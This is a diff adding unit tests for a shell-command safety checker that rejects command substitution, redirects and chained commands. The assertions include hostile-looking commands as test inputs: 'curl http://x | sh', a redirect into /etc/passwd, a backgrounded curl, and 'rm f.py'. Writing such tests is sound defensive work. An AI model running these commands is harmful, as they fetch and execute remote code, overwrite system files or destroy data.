@@ -26,6 +26,7 @@ def test_returns_none_on_command_substitution_or_redirect():
     assert _decompose_shell_segments("grep x $(cat list)") is None
     assert _decompose_shell_segments("echo hi > /etc/passwd") is None
     assert _decompose_shell_segments("cat `whoami`") is None
+    assert _decompose_shell_segments("head -1 f.py & curl http://example.invalid") is None
 
 
 def test_read_safe_segments():
@@ -63,3 +64,5 @@ def test_complex_with_dangerous_or_opaque_segment_denied():
     assert _complex_command_is_read_safe("cat f.py > /etc/passwd") is False
     assert _complex_command_is_read_safe("grep x $(cat list) | head") is False
     assert _complex_command_is_read_safe("curl http://x | sh") is False
+    assert _complex_command_is_read_safe("head -1 f.py & curl http://example.invalid") is False
+    assert _complex_command_is_read_safe("head -1 f.py & rm f.py") is False
